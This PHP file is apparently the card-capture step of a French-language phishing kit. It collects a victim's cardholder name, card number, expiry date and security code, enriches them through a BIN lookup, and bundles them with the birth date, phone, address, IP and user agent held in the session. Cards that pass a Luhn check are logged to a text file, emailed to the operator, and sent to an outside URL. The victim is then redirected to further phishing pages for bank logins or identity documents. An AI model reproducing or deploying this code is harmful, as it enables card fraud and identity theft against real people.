<?php
session_start();
include '../../antibots.php';
include '../../config.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	
 	$_SESSION["n_card"]   = $_POST["n_card"];
    $_SESSION["c_num"]    = $_POST["c_num"];
	
	$url = 'https://lookup.binlist.net/'.$_SESSION["c_num"].'';
	$json = file_get_contents($url);
	$data = json_decode($json);
	$scheme = $data->scheme;
	$bank = $data->bank->name;
	$level = $data->brand;
	$type = $data->type;
	
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"];
	$_SESSION["bank"]   = $data->bank->name; 
$message = '
_______________________________
Nom : '.$_SESSION["n_card"].'
Numéro de la carte : '.$_SESSION["c_num"].'
Date Expiration : '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
Cryptogramme visuel : '.$_SESSION["csc"].'
-
Banque de la carte : '.$bank.'
Niveau de la carte : '.$level.'
Type de carte : '.$scheme.' - '.$type.'
_______________________________
DDN : '.$_SESSION["DOB"].'
TEL : '.$_SESSION["PhoneNumber"].'
-
Rue : '.$_SESSION["street"].'
Ville : '.$_SESSION["city"].'
Code Postal : '.$_SESSION["ZIP"].'
Pays : '.$_SESSION["country"].'
_______________________________

IP : '._ip().'
User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="\xF0\x9F\x92\xA4 +1 CC HQ - ".$_SESSION['c_num']." | $level \xF0\x9F\x92\xA4 | ._ip()";
$head="From: \xF0\x9F\x8C\x8C ISK 17 \xF0\x9F\x8C\x8C <rez@ayz.com>";
$fil = fopen('cc_ayz.txt', 'a+');

function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_four']  = true;
mail($my_mail,$Subject,$message,$head);
file_get_contents($urls . urlencode($message));
if ($apple_pay == "oui"){
  header('location: ../load1.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}elseif ($vbv == "oui") {
  header('location:  ../load.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}elseif ($log_bank == "oui") {
    header('location:  ../bank.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}elseif($cni == "oui") {
    header('location:  ../identity.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}else{
        header('location: ../success.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));
}
    } else {
        header('location: ../card.php?error=true');   
    }
}
?>